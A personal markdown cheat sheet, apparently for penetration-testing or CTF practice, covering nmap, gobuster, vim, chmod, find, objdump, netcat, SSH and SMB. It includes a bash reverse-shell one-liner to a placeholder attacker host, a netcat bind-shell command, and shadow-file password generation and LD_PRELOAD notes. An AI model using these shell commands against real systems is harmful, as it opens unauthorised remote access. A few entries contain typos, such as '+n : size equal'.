# Notes regarding tools/methods/etc


## Linux misc
- mkpasswd - Generate password (for /etc/shadow for example)
  - Example: mkpasswd -m sha-512 \<password>
- openssl passwd \<password> - Generate password (for /etc/passwd in this example)
- Env vars:
  - LD_PRELOAD - loads a shared object before any others when a program is run. 
  - LD_LIBRARY_PATH - provides a list of directories where shared libraries are searched for first
- Bash rev shell:
  - #!/bin/bash
  - bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
- Bash:
  - Version < 4.2-048 - possible to create functions with names like paths

## Nmap
- syntax: namp [options] ip
### options
- -sV	Attempts to determine the version of the services running
- -sC	Scan with the default nmap scripts
- -p \<x> or -p-	Port scan for port <x> or scan all ports
- -p-x Scan ports from 1 to x
- -Pn	Disable host discovery and just scan for open ports
- -A	Enables OS and version detection, executes in-build scripts for further enumeration 
- -v	Verbose mode
- -sU	UDP port scan
- -sS	TCP SYN port scan
- -oN   output to normal file
- --script=\<list,of,scripts/categories> (ex: --script=vuln)


## gobuster
- -e	Print the full URLs in your console
- -u	The target URL
- -w	Path to your wordlist
- -U and -P	Username and Password for Basic Auth
- -p \<x>	Proxy to use for requests
- -c \<http cookies>	Specify a cookie for simulating your auth
- -o Output to file
  
## VI/VIM
- Vim -O file1 file2 (open two files vertically) <br> 
- CTRL+W+ARROWS -> switch between panes <br>
- O (insert new line and insert) <br>
- Shift+O (insert new line above and insert) 
- Settings  
  - ~/.vimrc 
  - set autoindent 
  - set tabstop=4 
  - colorscheme default 
  - Syntax on 
  - Set number 
 
## CHMOD
- file perms: xxx(usr)-xxx(group)-xxx(else)
- 1	That file can be executed
- 2	That file can be written to
- 3	That file can be executed and written to
- 4	That file can be read
- 5	That file can be read and executed
- 6	That file can be written to and read
- 7	That file can be read, written to, and executed

### Examples
- chmod 755 file : -rwxr-xr-x

## CHOWN (change ownership)
- chown user:group file
  

## Python 
- Conversions 
  - Int(binary, base)  -> int("111", 2) = 7 
  - Hex(int_value) 
- Encode/decode 
  - String.encode(mode) 
  - String.decode(mode)   
- Struct 
  - Struct.unpack(format, bytes) -> convert bytes to value 
  - Struct.pack(format, value) -> convert value to bytes 
- MODES: 
  - <  - little endian 
  - \>  - bing-endian  
  - ! - network (big-endian)  
 
## Objdump 
- Print headers: -x  
- Disassemble: -d 
- Syms: -t 
- Dynamic syms: -T 
- Reloc: -r 
- Dynamic reloc: -R 
 
## Strace  
- Trace syscalls 
 
## Ltrace  
- Trace library functions  
 
## Nc 
- nc -lvp port (listen on port) 
- nc -lvp port -e /program (listen on port and lauch program at connection) 
- nc addr port  (connect to port) 
 
## Symlinks 
- Ln -s file sym (create soft symbolic link) 
- Ln -sf file sym (replaces if exist ) 
 
## Find files 
- -group \<group_name> : find files for group with groupname
- -name \<file_name> (case SENSITIVE)
- -iname \<file_name> (case INSENSITIVE)
- -print 2>/dev/null -> dont print errors
- -f \<type> -> specify file type
- -user \<username> -> sepecify file owner
- -perm \<permissions> : find file with specific permissions
  - Format: 
    - Octal : 644
    - symbolic: u=r 
  - Modifiers:
    - \- : files with at least
    - / : files with any u,g or e that match
  - <b>example: -perm -444</b>
- -size n : find file with size n
  - -n : size less than
  - n : size equal
  - +n : size equal
  - Type of size
    - c : bytes
    - k : KiB's
    - M : MiB's
  - <b> example: -size -30c</b> 
- time
  - Prefixes
    - a : accessed
    - m : modified
    - c : changed
  - words
    - time : days
    - min : minutes
  - <b>example: -amin +30 </b> : file accessed more than 30 minutes ago
  - <b>example 2: -mtime -7 </b> : file modified less than 7 days ago (time 0 specify last 24 hours)
- -type
    - b : block special
    - c : character special
    - d : directory
    - f : regular file
    - l : symbolic link
    - p : FIFO
    - s : socket
## SSH 
- Ssh user@ip 
- Ssh -i rsa_key user@ip 
- Scp user@ip:/file/to/get /path/to/store 

## SMB

Protocol for sharing resources (files, printers, etc)

### Common flaws
1 - Default credentials
2 - Samba server (usually insecure)

